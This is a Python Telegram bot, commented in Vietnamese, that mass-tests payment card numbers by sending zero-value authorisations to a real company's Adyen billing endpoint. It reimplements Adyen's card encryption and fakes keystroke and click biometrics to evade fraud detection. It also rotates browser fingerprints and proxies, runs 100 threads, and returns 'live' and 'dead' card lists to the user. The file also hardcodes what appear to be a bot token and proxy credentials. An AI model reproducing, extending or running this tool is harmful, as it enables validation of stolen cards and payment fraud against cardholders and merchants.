import os
import json
import hmac
import hashlib
import base64
import re
import string
import random
import sys
import time
import uuid
from datetime import datetime
import io
import threading
import queue
import asyncio
import psutil

# Thư viện Telegram Bot (V20+)
from telegram import Update, InputFile
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters

# Thư viện mã hóa
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP, AES
from Cryptodome.Util.Padding import pad
from jose import jwk

# Thư viện Request (PycURL)
import pycurl

# ===================================================================
# === CẤU HÌNH BOT TELEGRAM
# ===================================================================

BOT_TOKEN = "8110946929:AAGFn8gap9gMHH4_pABitcNd-saTGl24g0I"  # <--- ĐIỀN TOKEN VÀO ĐÂY
ADMIN_ID = None # Nếu muốn giới hạn người dùng, điền ID vào đây (dạng số), ví dụ: 123456789

# Biến toàn cục để quản lý trạng thái
active_tasks = {}

# Khóa luồng
stats_lock = threading.Lock()

# ===================================================================
# === PHẦN 1: CÁC HÀM VALIDATION THẺ (GIỮ NGUYÊN)
# ===================================================================

def normalize_card(card_str):
    """Chuẩn hóa chuỗi thẻ về định dạng cc|mm|yyyy|cvv."""
    pattern = r'(\d{13,19})[|/:](\d{1,2})[|/:](\d{2,4})[|/:](\d{3,4})'
    match = re.search(pattern, card_str)
    if not match:
        return None
    card_num, month, year, cvv = match.groups()
    
    # Xử lý tháng
    month_int = int(month)
    if month_int < 1 or month_int > 12:
        return None
    month = month.zfill(2)
    
    # Xử lý năm (chuyển 2 số thành 4 số)
    if len(year) == 2:
        year = '20' + year
    year_int = int(year)
    if year_int < 2000 or year_int > 2099:
        return None
        
    return f"{card_num}|{month}|{year}|{cvv}"

def validate_luhn(card_number):
    """Kiểm tra thuật toán Luhn cho số thẻ."""
    card_num = ''.join(filter(str.isdigit, str(card_number)))
    if not card_num or len(card_num) < 13 or len(card_num) > 19:
        return False
    total = 0
    reverse_digits = card_num[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if i % 2 == 1:
            n = n * 2
            if n > 9:
                n = n - 9
        total += n
    return total % 10 == 0

def get_short_brand_name(cc):
    first_digit = cc[0]
    if first_digit in ['5', '2']: return 'mc'
    elif first_digit == '4': return 'visa'
    elif cc.startswith('34') or cc.startswith('37'): return 'amex'
    elif cc.startswith('60') or cc.startswith('64') or cc.startswith('65'): return 'discover'
    elif cc.startswith('62'): return 'cup'
    elif cc.startswith('35'): return 'jcb'
    elif cc.startswith('30') or cc.startswith('36') or cc.startswith('38'): return 'diners'
    elif cc.startswith('67'): return 'maestro'
    else: return 'unknown'


# ===================================================================
# === PHẦN 2: LOGIC MÃ HÓA ADYEN (GIỮ NGUYÊN)
# ===================================================================

def get_current_timestamp():
    """Tạo timestamp theo định dạng ISO 8601 UTC."""
    return datetime.utcnow().isoformat() + 'Z'

def generate_fake_log(input_len):
    """
    Giả lập hành vi người dùng (Behavioral Biometrics)
    """
    log_entries = []
    
    # Thời gian bắt đầu ngẫu nhiên
    current_time = random.randint(2000, 5000)
    
    # 1. Focus
    log_entries.append(f"fo@{current_time}")
    current_time += random.randint(50, 200)
    
    # 2. Click
    log_entries.append(f"cl@{current_time}")
    current_time += random.randint(100, 300)
    
    # 3. Gõ phím
    for _ in range(input_len):
        log_entries.append(f"KN@{current_time}")
        current_time += random.randint(60, 180) 
        
    return ",".join(log_entries)

def w(e):
    t = e
    if isinstance(t, str):
        t = t.encode('utf-8')
    return base64.b64encode(t).decode('utf-8')

def _(e):
    return w(e).replace('=', '').replace('+', '-').replace('/', '_')

def k(e):
    if not e:
        return bytearray(0)
    if len(e) % 2 == 1:
        e = "0" + e
    t = len(e) // 2
    r = bytearray(t)
    for n in range(t):
        r[n] = int(e[n*2:n*2+2], 16)
    return r

bt = 2**32

def mt(e, t, r):
    if not (0 <= t < bt):
        raise ValueError(f"value must be >= 0 and <= {bt - 1}. Received {t}")
    e[r:r+4] = [(t >> 24) & 0xff, (t >> 16) & 0xff, (t >> 8) & 0xff, t & 0xff]

class AdyenV4_8_0:
    def __init__(self, site_key):
        self.site_key = site_key
        self.key_object = None

    def generate_key(self):
        parts = self.site_key.split("|")
        if len(parts) != 2:
            raise ValueError("Malformed public key: incorrect split parts")
        
        part1 = parts[0]
        part2 = parts[1]
        
        decoded_part1 = k(part1)
        decoded_part2 = k(part2)

        encoded_part1 = _(decoded_part1)
        encoded_part2 = _(decoded_part2)

        self.key_object = {
            "kty": "RSA",
            "kid": "asf-key",
            "e": encoded_part1,
            "n": encoded_part2,
            "alg": "RSA-OAEP",
        }
        return self.key_object

    def encrypt_data(self, plain_text):
        public_key = jwk.construct(self.key_object)
        pem = public_key.to_pem().decode('utf-8')
        rsa_key = RSA.import_key(pem)

        random_bytes = os.urandom(64)
        
        cipher_rsa = PKCS1_OAEP.new(rsa_key)
        encrypted_key = cipher_rsa.encrypt(random_bytes)
        
        cek = random_bytes
        
        protected_header = {"alg":"RSA-OAEP","enc":"A256CBC-HS512","version":"1"}
        protected_header_b64 = _(json.dumps(protected_header).encode('utf-8'))
        
        _iv = os.urandom(16)
        _plaintext = json.dumps(plain_text).encode('utf-8')
        
        aes_key = cek[32:]
        hmac_key = cek[:32]
        
        cipher_aes = AES.new(aes_key, AES.MODE_CBC, _iv)
        padded_plaintext = pad(_plaintext, AES.block_size)
        ciphertext = cipher_aes.encrypt(padded_plaintext)
        
        protected_header2_bytes = protected_header_b64.encode('utf-8')
        
        f = len(protected_header2_bytes) * 8
        d = f // bt
        h_val = f % bt
        y = bytearray(8)
        mt(y, d, 0)
        mt(y, h_val, 4)

        hmac_obj = hmac.new(hmac_key, digestmod=hashlib.sha512)
        hmac_obj.update(protected_header2_bytes + _iv + ciphertext + y)
        tag = hmac_obj.digest()[:32]

        return f"{protected_header_b64}.{_(encrypted_key)}.{_(_iv)}.{_(ciphertext)}.{_(tag)}"

def format_card_number(card):
    return ' '.join(card[i:i+4] for i in range(0, len(card), 4))

def encrypt_card_data_480(card, month, year, cvc, adyen_key, stripe_key=None, domain=None):
    if not all([card, month, year, cvc, adyen_key]):
        raise ValueError("Missing card details or Adyen key")

    if not stripe_key:
        stripe_key = "live_2WKDYLJCMBFC5CFHBXY2CHZF4MUUJ7QU"
    if not domain:
        domain = "https://www.mytheresa.com"
        
    domain_b64 = base64.b64encode(domain.encode('utf-8')).decode('utf-8')
    referrer = f"https://checkoutshopper-live.adyen.com/checkoutshopper/securedfields/{stripe_key}/5.5.0/securedFields.html?type=card&d={domain_b64}"
    
    card_number = format_card_number(card)

    fake_number_log = generate_fake_log(16)
    fake_cvc_log = generate_fake_log(3)

    card_detail = {
        "encryptedCardNumber": {
            "number": card_number, 
            "generationtime": get_current_timestamp(), 
            "numberBind": "1", 
            "activate": "3", 
            "referrer": referrer, 
            "numberFieldFocusCount": "1", 
            "numberFieldLog": fake_number_log, 
            "numberFieldClickCount": "1", 
            "numberFieldKeyCount": "16"
        },
        "encryptedExpiryMonth": {"expiryMonth": month, "generationtime": get_current_timestamp()},
        "encryptedExpiryYear": {"expiryYear": year, "generationtime": get_current_timestamp()},
        "encryptedSecurityCode": {
            "cvc": cvc, 
            "generationtime": get_current_timestamp(), 
            "cvcBind": "1", 
            "activate": "4", 
            "referrer": referrer, 
            "cvcFieldFocusCount": "1", 
            "cvcFieldLog": fake_cvc_log, 
            "cvcFieldClickCount": "1", 
            "cvcFieldKeyCount": "3", 
            "cvcFieldChangeCount": "1", 
            "cvcFieldBlurCount": "1", 
            "deactivate": "2"
        }
    }

    adyen_encryptor = AdyenV4_8_0(adyen_key)
    adyen_encryptor.generate_key()
    
    encrypted_details = {}
    for key, value in card_detail.items():
        encrypted_details[key] = adyen_encryptor.encrypt_data(value)
        
    return encrypted_details

# ===================================================================
# === PHẦN 3: GENERATE DESKTOP PROFILE (GIỮ NGUYÊN)
# ===================================================================

def generate_browser_profile():
    chrome_version = random.randint(120, 131)
    user_agent = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36"
    return {
        "user_agent": user_agent,
        "sec_ch_ua": f'"Not_A Brand";v="8", "Chromium";v="{chrome_version}", "Google Chrome";v="{chrome_version}"',
        "platform": '"Windows"'
    }

def generate_checkout_attempt_id():
    uuid_part = str(uuid.uuid4())
    suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=50))
    return f"{uuid_part}{suffix}"

# ===================================================================
# === PHẦN 4: HÀM CHECK THẺ (CORE)
# ===================================================================

def check_card_core(cc, mm, yyyy, cvc):
    """Hàm xử lý logic check thẻ, trả về chuỗi kết quả và thời gian."""
    start_time_card = time.time()
    
    # Cấu hình API Key (Giữ nguyên)
    ADYEN_PUB_KEY = "10001|C740E51C2E7CEDAFC96AA470E575907B40E84E861C8AB2F4952423F704ABC29255A37C24DED6068F7D1E394100DAD0636A8362FC1A5AAE658BB9DA4262676D3BFFE126D0DF11C874DB9C361A286005280AD45C06876395FB60977C25BED6969A3A586CD95A3BE5BE2016A56A5FEA4287C9B4CAB685A243CFA04DC5C115E11C2473B5EDC595D3B97653C0EA42CB949ECDEA6BC60DC9EDF89154811B5E5EBF57FDC86B7949BA300F679716F67378361FF88E33E012F31DB8A14B00C3A3C2698D2CA6D3ECD9AE16056EE8E13DFFE2C99E1135BBFCE4718822AB8EA74BEBA4B1B99BBE43F2A6CC70882B6E5E1A917F8264180BE6CD7956967B9D8429BF9C0808004F"
    STRIPE_KEY = "live_CFDMTKEQ6RE5FPLXYTYYUGWJBUCBUWI7" 
    TARGET_DOMAIN = "https://www.activecampaign.com"

    data = {}
    success_request = False
    max_retries = 20
    current_try = 0
    
    # Logic Re-try
    while current_try < max_retries:
        try:
            encrypted_result = encrypt_card_data_480(
                card=cc, month=mm, year=yyyy, cvc=cvc, 
                adyen_key=ADYEN_PUB_KEY, stripe_key=STRIPE_KEY, domain=TARGET_DOMAIN
            )

            profile = generate_browser_profile()
            email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + '@gmail.com'
            city = 'New York' 
            telephoneNumber = ''.join(random.choices(string.digits, k=10))
            name = ''.join(random.choices(string.ascii_letters + ' ', k=10)).strip()
            attempt_id = generate_checkout_attempt_id()

            headers_list = [
                'accept: application/json, text/plain, */*',
                'accept-language: en-US,en;q=0.9',
                'cache-control: no-cache',
                'content-type: application/json',
                f'user-agent: {profile["user_agent"]}',
                f'sec-ch-ua: {profile["sec_ch_ua"]}',
                'sec-ch-ua-mobile: ?0',
                f'sec-ch-ua-platform: {profile["platform"]}',
                'origin: https://www.activecampaign.com',
                'pragma: no-cache',
                'referer: https://www.activecampaign.com/signup/?code=ac&tier=starter&contacts=1000&currency=USD',
                'sec-fetch-dest: empty',
                'sec-fetch-mode: cors',
                'sec-fetch-site: same-origin',
            ]

            json_data = {
                'paymentMethod': {
                    'type': 'scheme',
                    'holderName': name,
                    'encryptedCardNumber': encrypted_result['encryptedCardNumber'],
                    'encryptedExpiryMonth': encrypted_result['encryptedExpiryMonth'],
                    'encryptedExpiryYear': encrypted_result['encryptedExpiryYear'],
                    'encryptedSecurityCode': encrypted_result['encryptedSecurityCode'],
                    'brand': get_short_brand_name(cc),
                    'checkoutAttemptId': attempt_id,
                },
                'shopperEmail': email,
                'shopperName': name,
                'billingAddress': {'city': city, 'country': 'US', 'houseNumberOrName': '123', 'postalCode': '10001', 'stateOrProvince': 'NY', 'street': 'Broadway'},
                'telephoneNumber': telephoneNumber,
                'amount': {'value': 0, 'currency': 'USD'},
                'returnUrl': 'https://www.activecampaign.com/signup/?code=ac&tier=starter&contacts=1000&currency=USD',
            }

            post_body = json.dumps(json_data).encode('utf-8')

            buffer = io.BytesIO()
            c = pycurl.Curl()
            c.setopt(pycurl.URL, 'https://www.activecampaign.com/api/billing/adyen/payments')
            c.setopt(pycurl.POST, 1)
            c.setopt(pycurl.POSTFIELDS, post_body)
            c.setopt(pycurl.HTTPHEADER, headers_list)
            
            # Proxy
            session_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
            proxy_url = "http://aus.360s5.com:3600"
            base_auth = "88634867-zone-custom"
            pass_auth = "AetOKcLB"
            proxy_auth = f"{base_auth}-session-{session_id}:{pass_auth}"
            
            c.setopt(pycurl.PROXY, proxy_url)
            c.setopt(pycurl.PROXYUSERPWD, proxy_auth)
            c.setopt(pycurl.SSL_VERIFYPEER, 0)
            c.setopt(pycurl.SSL_VERIFYHOST, 0)
            c.setopt(pycurl.TIMEOUT, 30)
            c.setopt(pycurl.WRITEDATA, buffer)

            c.perform()
            c.close()

            response_text = buffer.getvalue().decode('utf-8')

            try:
                data = json.loads(response_text)
                success_request = True
                break
            except json.JSONDecodeError:
                pass

        except Exception as e:
            pass
        
        current_try += 1
        time.sleep(1)

    end_time_card = time.time()
    time_taken = round(end_time_card - start_time_card, 2)
    time_str = f"TimeTaken: {time_taken}s"

    if not success_request:
        return "ERROR", f"{cc}|{mm}|{yyyy}|{cvc}|ERROR|NETWORK_FAIL|MAX_RETRIES|{time_str}"

    additionalData = data.get('additionalData', {})
    cvcResultRaw = additionalData.get('cvcResultRaw', 'N/A')
    cvcResult = additionalData.get('cvcResult', 'N/A')
    avsResultRaw = additionalData.get('avsResultRaw', 'N/A')
    avsResult = additionalData.get('avsResult', 'N/A')
    refusalReasonRaw = additionalData.get('refusalReasonRaw', 'N/A')
    refusalReason = data.get('refusalReason', additionalData.get('refusalReason', 'N/A'))
    resultCode = data.get('resultCode', additionalData.get('resultCode', 'N/A'))
    message = data.get('message', 'N/A')

    msg = ""
    status = "ERROR"
    if resultCode == "Authorised" or resultCode == "Cancelled":
        msg = "APPROVED ✅"
        status = "LIVE"
    elif resultCode == "Refused":
        msg = f"DIE - {refusalReason}"
        status = "DIE"
    elif resultCode in ["IdentifyShopper", "ChallengeShopper", "RedirectShopper"]:
        msg = "3DS - 3D Secure required"
        status = "DIE" # Coi 3DS là Die tùy quy ước, ở đây để DIE
    else:
        msg = f"UNK - {message if message != 'N/A' else resultCode}"
        status = "ERROR"

    result_string = f"{cc}|{mm}|{yyyy}|{cvc}|{cvcResultRaw}|{cvcResult}|{avsResultRaw}|{avsResult}|{resultCode}|{refusalReasonRaw}|{msg}|{time_str}"
    
    return status, result_string

# ===================================================================
# === PHẦN 5: BOT LOGIC & MULTI-THREADING HANDLER
# ===================================================================

def bot_worker(chat_id, card_list):
    """Worker quản lý luồng cho Bot."""
    q = queue.Queue()
    for card in card_list:
        q.put(card)

    def thread_task():
        while True:
            try:
                line_card = q.get(timeout=1)
            except queue.Empty:
                break
            
            # Normalize
            normalized = normalize_card(line_card)
            if not normalized:
                q.task_done()
                continue
                
            cc, mm, yyyy, cvc = normalized.split('|')
            if not validate_luhn(cc):
                q.task_done()
                continue

            try:
                status, result_str = check_card_core(cc, mm, yyyy, cvc)
                
                with stats_lock:
                    stats = active_tasks[chat_id]['stats']
                    stats['checked'] += 1
                    if status == "LIVE":
                        stats['live'] += 1
                        active_tasks[chat_id]['live_lines'].append(result_str)
                    elif status == "DIE":
                        stats['die'] += 1
                        active_tasks[chat_id]['die_lines'].append(result_str)
                    else:
                        stats['error'] += 1
            except Exception as e:
                with stats_lock:
                    active_tasks[chat_id]['stats']['error'] += 1
            finally:
                q.task_done()

    # Chạy 100 luồng con
    threads = []
    num_threads = 100 
    for _ in range(num_threads):
        t = threading.Thread(target=thread_task)
        t.start()
        threads.append(t)
    
    # Chờ Queue xong
    q.join()
    # Chờ Threads xong
    for t in threads:
        t.join()

    # Đánh dấu đã xong
    active_tasks[chat_id]['is_running'] = False

# ===================================================================
# === PHẦN 6: TELEGRAM HANDLERS
# ===================================================================

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Chào mừng!\n"
        "1. Gửi file `.txt` (định dạng `cc|mm|yy|cvv`) để chạy check (100 luồng).\n"
        "2. Dùng `/st cc|mm|yy|cvv` để check lẻ."
    )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.chat_id
    
    # Kiểm tra nếu đang chạy
    if chat_id in active_tasks and active_tasks[chat_id].get('is_running'):
        await update.message.reply_text("⚠️ Đang có tiến trình chạy. Vui lòng chờ xong!")
        return

    document = update.message.document
    file_name = document.file_name
    
    if not file_name.endswith('.txt'):
        await update.message.reply_text("❌ Chỉ nhận file .txt")
        return

    # Tải file về
    file = await document.get_file()
    file_content = await file.download_as_bytearray()
    decoded_content = file_content.decode('utf-8', errors='ignore')
    
    cards = [line.strip() for line in decoded_content.splitlines() if line.strip()]
    total_cards = len(cards)
    
    if total_cards == 0:
        await update.message.reply_text("❌ File trống.")
        return

    # Khởi tạo Stats
    active_tasks[chat_id] = {
        'stats': {'live': 0, 'die': 0, 'error': 0, 'checked': 0, 'total': total_cards},
        'live_lines': [],
        'die_lines': [],
        'is_running': True,
        'start_time': time.time(),
        'message_id': None
    }

    # Gửi tin nhắn Dashboard
    msg = await update.message.reply_text(
        f"🚀 <b>Starting Task...</b>\nTotal: {total_cards}\nThreads: 100", 
        parse_mode='HTML'
    )
    active_tasks[chat_id]['message_id'] = msg.message_id

    # Chạy worker trong luồng riêng để không block Bot Async
    threading.Thread(target=bot_worker, args=(chat_id, cards)).start()

    # Chạy Loop cập nhật tin nhắn
    asyncio.create_task(update_status_loop(update, context))

async def update_status_loop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.chat_id
    msg_id = active_tasks[chat_id]['message_id']
    
    while True:
        if chat_id not in active_tasks:
            break
            
        task_data = active_tasks[chat_id]
        stats = task_data['stats']
        is_running = task_data['is_running']
        
        # Tính toán CPM, CPU, RAM
        elapsed = time.time() - task_data['start_time']
        if elapsed > 0:
            cpm = int((stats['checked'] / elapsed) * 60)
        else:
            cpm = 0
            
        cpu_usage = psutil.cpu_percent()
        ram_usage = psutil.virtual_memory().percent
        
        text = (
            f"⚡ <b>STATUS CHECKING</b> ⚡\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"✅ Live: {stats['live']}\n"
            f"❌ Die: {stats['die']}\n"
            f"⚠️ Error: {stats['error']}\n"
            f"🔄 Progress: {stats['checked']}/{stats['total']}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🚀 CPM: {cpm}\n"
            f"💻 CPU: {cpu_usage}% | RAM: {ram_usage}%\n"
            f"⏳ Time: {int(elapsed)}s"
        )
        
        try:
            await context.bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=text, parse_mode='HTML')
        except Exception:
            pass # Bỏ qua lỗi nếu tin nhắn không thay đổi hoặc limit
            
        if not is_running:
            break
            
        await asyncio.sleep(1.5) # Update mỗi 1.5s để tránh Flood Limit (Telegram cấm spam edit < 1s)

    # Khi xong: Gửi file
    await send_results(update, context)

async def send_results(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.chat_id
    task_data = active_tasks[chat_id]
    
    # Tạo file Live
    if task_data['live_lines']:
        live_content = "\n".join(task_data['live_lines'])
        live_file = io.BytesIO(live_content.encode('utf-8'))
        live_file.name = "Live_Cards.txt"
        await context.bot.send_document(chat_id=chat_id, document=live_file, caption=f"✅ {len(task_data['live_lines'])} Live Cards")

    # Tạo file Die (nếu cần, thường thì nhiều quá nên cân nhắc)
    if task_data['die_lines']:
        # Chỉ gửi nếu số lượng không quá lớn để tránh spam bandwidth, ở đây gửi hết theo yêu cầu full
        die_content = "\n".join(task_data['die_lines'])
        die_file = io.BytesIO(die_content.encode('utf-8'))
        die_file.name = "Die_Cards.txt"
        await context.bot.send_document(chat_id=chat_id, document=die_file, caption=f"❌ {len(task_data['die_lines'])} Die Cards")
        
    await context.bot.send_message(chat_id=chat_id, text="✅ <b>COMPLETED ALL TASKS</b>", parse_mode='HTML')
    
    # Dọn dẹp
    del active_tasks[chat_id]

async def check_single_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    # Format: /st cc|mm|yy|cvv
    try:
        raw_card = text.split(' ')[1]
    except IndexError:
        await update.message.reply_text("⚠️ Sai cú pháp. Dùng: `/st cc|mm|yy|cvv`", parse_mode='Markdown')
        return

    normalized = normalize_card(raw_card)
    if not normalized:
        await update.message.reply_text("❌ Định dạng thẻ không hợp lệ.")
        return

    msg = await update.message.reply_text("🔄 Checking...")
    
    cc, mm, yyyy, cvc = normalized.split('|')
    
    # Run sync function in executor
    loop = asyncio.get_running_loop()
    status, result_str = await loop.run_in_executor(None, check_card_core, cc, mm, yyyy, cvc)
    
    await context.bot.edit_message_text(chat_id=update.message.chat_id, message_id=msg.message_id, text=f"<code>{result_str}</code>", parse_mode='HTML')

# ===================================================================
# === MAIN EXECUTION
# ===================================================================

def main():
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN_HERE":
        print("Vui lòng điền BOT TOKEN vào code trước khi chạy!")
        return

    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("st", check_single_card))
    application.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_document))

    print("Bot đang chạy...")
    application.run_polling()

if __name__ == '__main__':
    main()
